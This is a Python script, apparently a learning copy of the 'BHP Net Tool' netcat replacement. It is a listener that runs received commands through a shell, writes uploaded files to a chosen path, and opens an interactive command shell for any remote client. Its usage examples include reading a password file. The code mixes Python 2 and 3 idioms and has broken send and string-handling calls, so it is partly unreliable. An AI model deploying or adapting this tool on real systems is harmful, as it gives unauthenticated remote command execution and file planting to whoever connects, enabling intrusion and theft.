import sys
import socket
import getopt
import threading
import subprocess


# global variables
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print("BHP Net Tool")
    print("")
    print("Usage: bhpnet.py -t target_host -pp port")
    print("-l --listen               - listen on [host]:[port] for")
    print("                            incoming connections")
    print("-e --execute=file_to_run  - execute the given file upon")
    print("                            receiving a connection")
    print("-c --command              - initialize a command shell")
    print("-u --upload=destination   - upon receiving connection uppload a")
    print("                            file and write to [destination]")
    print("")
    print("")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /ext/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    
    # read command options
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",
        ["help","listen","execute","target","port","command",""])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    
    # listen or send data from stdin
    if not listen and len(target) and port > 0:
        print("TARGET:",target)
        # read memory data from command
        # block, do not send CTRL-D when send data to stdin
        
        buffer = sys.stdin.read()

        # send data

        client_sender(buffer)

    # ready for listening and prepare to upload files , execute commands
    # place a shell 
    if listen:
        server_loop()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    try:
        # connect to the target host computer
        client.connect((target,port))

        if len(buffer):
            client.send(buffer.encode())
        
        while True:
            
            # wait for the back date
            rece_len = 1
            response = ""
            print("client is waiting for the data")
            while rece_len:
                data = client.recv(4096)
                rece_len = len(data)
                response+= data

                if rece_len < 4096:
                    break
            print(response)

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            # send
            client.send(buffer.encode())
    
    except:
        print("[*] Exception! Exiting.")

        client.close()

def server_loop():
    global target

    # if do not define target, then listen all hosts
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    print("BIND:",target,port)
    server.listen(5) 

    while True:
        print("ready for accept!!")
        client_socket, addr = server.accept()

        print("SERVER accept, make a client thread")
        client_thread = threading.Thread(target=client_handler,
        args=(client_socket,))
        client_thread.start()

def run_command(command):

    # newline
    command = command.rstrip()

    # run commands and return output
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command \r\n"
    
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #check upload file
    if len(upload_destination):

        #read all characters and write the target
        file_buffer = ""

        #
        while True:
            data = client_socket.recv(1024)
            print("received data:",data)
            if not data:
                break
            else:
                file_buffer += data
        # write the received data
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
        
            client_socket.send("Successfully saved file to {}".encode(),upload_destination)

        except:
            client_socket.send("Failed to save file to {}".encode(),upload_destination)


    # check command execute
    if len(execute):
        
        # run command
        output = run_command(execute)

        client_socket.send(output.encode())

    # if need another shell , go another loop
    if command:

        while True:
            # open a window
            #client_socket.send("<BHP:#".encode())

            # receive file untill find enter key
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                print("command: recv client data")
                
                cmd_buffer += str(client_socket.recv(1024))
                print("cmd_buffer:  ",cmd_buffer)
            
            response = run_command(cmd_buffer)

            client_socket.send(response.encode())

main()
